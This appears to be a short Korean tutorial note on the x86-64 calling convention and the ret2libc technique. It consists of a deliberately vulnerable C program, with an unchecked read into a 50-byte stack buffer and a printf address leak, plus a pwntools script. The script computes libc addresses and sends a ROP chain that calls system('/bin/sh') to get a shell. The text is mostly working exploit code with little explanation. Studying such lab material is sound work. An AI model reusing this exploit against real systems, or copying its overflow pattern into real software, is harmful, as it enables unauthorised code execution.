Calling Convention

  • RDI, RSI, RDX, RCX, R8,R9 : 정수 메모리 주소 인수 전달
  • XMM0, XMM1, XMM2, XMM3, XMM4, XMM5, XMM6, XMM7 : 부동 소수점 인수 전달
  • RAX : Return Value Register

// Vuln Code
// gcc -fno-stack-protector -o ret2libc ret2libc.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
 
void vuln(){
    char buf[50] = "";
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 100);
}
 
void main(){
    vuln();
}

# Exploit Code
from pwn import *

p=process('./ret2libc')

recv = p.recvline()
buf = int(recv.split(' ')[3],16)
libBase = buf - 0x55800
system = libBase + 0x45390
binsh = libBase + 0x18cd57
poprdi = 0x400763

print('buf     :' + hex(buf))
print('pop rdi :' + hex(poprdi))
print('/bin/sh :' + hex(binsh))
print('system  :' + hex(system))

exploit = "A"*72 + p64(poprdi) + p64(binsh) + p64(system)

p.send(exploit)

p.interactive()
